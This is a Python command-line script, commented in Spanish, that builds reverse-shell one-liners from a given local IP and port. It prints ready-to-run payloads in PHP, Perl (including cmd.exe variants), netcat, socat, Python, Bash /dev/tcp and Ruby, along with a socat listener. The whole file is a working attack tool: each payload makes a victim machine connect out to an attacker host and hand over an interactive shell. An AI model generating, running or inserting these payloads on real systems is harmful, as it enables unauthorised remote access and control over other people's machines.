#!/usr/bin/python

import argparse
import re

# Argparse sirve para correcta implementación de argumentos del script


# Creamos el parser
parser = argparse.ArgumentParser()

# Añadimos los argumentos requeridos por el programa
parser.add_argument("-lp","--local-port",required=True, help="Indicar el puerto TCP local")
parser.add_argument("-lh","--local-host",required=True, help="Indicar la dirección IP local")
parser.add_argument("-t","--type",required=True,choices=['php','phpw','bash','ruby','perl','perlw','nc','socat','socatlisten','python'], help="Indica el tipo de comando a mostrar")

# Muestra información cuando se ha producido un error
args = parser.parse_args()
puerto = ""
ip = ""

# A continuación filtramos los argumentos para comprobar si son válidos

if int(args.local_port) in range(1,65536):
	puerto = args.local_port
	
	if re.match(r'^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$',args.local_host):
		ip = args.local_host
	else:
		print("Introduzca una IP válida")
		exit()
else:
	print("\nIntroduzca un número de puerto válido [1, 65535]")
	exit()

# Se muestra la reverse_shell demandada

print("Comando:\n")

if args.type == "php":
	ip = '"' + ip + '"'
	print("""php -r '$sock=fsockopen("""+ip+""","""+puerto+""");exec("/bin/sh -i <&3 >&3 2>&3");'""")

elif args.type == "phpw":
        ip = '"' + ip + '"'
        print("""php -r '$sock=fsockopen("""+ip+""","""+puerto+""");exec("cmd.exe <&3 >&3 2>&3");'""")


elif args.type == "perl":
	ip = '"' + ip + '"'
	print("""perl -e 'use Socket;$i="""+ip+""";$p=""" + puerto + """;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""")

elif args.type == "perlw":
        ip = '"' + ip + '"'
        print("""perl -e 'use Socket;$i="""+ip+""";$p=""" + puerto + """;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("cmd.exe");};'""")



elif args.type == "nc":
	print("nc -e /bin/sh "+ip+" "+puerto)

elif args.type == "socat":
	print("socat TCP4:"+ip+":"+puerto+" EXEC:/bin/bash")

elif args.type == "python":
	ip = '"' + ip + '"'
	print("""python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("""+ip+""","""+puerto+"""));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'""")

elif args.type == "bash":
	print("bash -i >& /dev/tcp/" + ip + "/" + puerto + " 0>&1")

elif args.type == "socatlisten":
	print("socat -d -d TCP4-LISTEN:"+puerto+" STDOUT")

elif args.type == "ruby":
	ip = '"' + ip +'"'
	print("""ruby -rsocket -e'f=TCPSocket.open("""+ip+""","""+puerto+""").to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'""")
